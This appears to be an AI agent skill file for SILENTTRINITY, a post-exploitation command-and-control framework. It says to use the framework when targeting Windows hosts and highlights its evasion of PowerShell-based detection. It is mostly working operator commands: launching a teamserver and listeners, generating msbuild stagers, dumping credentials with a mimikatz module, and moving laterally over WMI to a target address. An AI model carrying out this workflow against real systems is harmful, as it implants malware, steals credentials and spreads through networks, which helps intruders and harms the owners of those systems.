---
name: silenttrinity
description: "Post-exploitation C2 framework using Boo-lang .NET implants with asynchronous communication. Use when targeting Windows environments needing CLR-based implants that bypass traditional PowerShell-based detections."
license: MIT
compatibility: "Python 3.7+; pip install silenttrinity; Linux/macOS; github.com/byt3bl33d3r/SILENTTRINITY"
metadata:
  author: AeonDave
  version: "1.0"
---

# SILENTTRINITY (ST)

Asynchronous Python C2 with .NET (Boo) implants — evades PS-based detection.

## Quick Start

```bash
pip install silenttrinity

# Start teamserver
st teamserver 0.0.0.0 password

# Connect client
st client wss://127.0.0.1:5000 password

# Create listener
listeners new http
listeners start http

# Generate stager
stagers list
stagers generate msbuild http
```

## Core Commands

| Command | Purpose |
|---------|---------|
| `sessions` | Active implants |
| `sessions interact <id>` | Enter session |
| `modules list` | Available post-ex modules |
| `modules use <name>` | Load module |
| `run` | Execute loaded module against session |
| `listeners` | Manage C2 listeners |
| `stagers` | Generate implants |

## Common Workflows

**Credential dumping:**
```
modules use boo/credentials/mimikatz
run
```

**Lateral movement via WMI:**
```
modules use boo/lateral/invoke-wmi
set Target 192.168.1.50
run
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | Stager formats and module list |
